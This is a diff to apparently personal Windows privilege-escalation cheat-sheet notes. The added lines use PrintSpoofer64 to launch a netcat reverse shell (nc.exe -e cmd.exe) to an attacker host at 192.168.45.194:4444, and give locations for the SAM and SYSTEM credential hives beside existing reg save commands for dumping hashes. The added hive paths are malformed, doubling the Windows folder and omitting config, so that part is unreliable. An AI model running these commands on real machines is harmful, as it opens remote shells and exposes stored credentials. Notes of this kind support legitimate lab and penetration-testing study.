@@ -60,6 +60,11 @@ usage
 ```
 .\PrintSpoofer.exe -i -c cmd
 ```
+
+reverse shell
+```
+.\PrintSpoofer64.exe -i -c "C:\Users\eric.wallows\Desktop\nc.exe -e cmd.exe 192.168.45.194 4444"
+```
 ## Windows Services
 ### Service Binary Hijacking
 List of services with binary path
@@ -314,6 +319,12 @@ From registry
 reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
+```
+
+or filesystem
+```
+C:\Windows\Windows\System32\SAM
+C:\Windows\Windows\System32\SYSTEM
 ```
 
 extract the hash
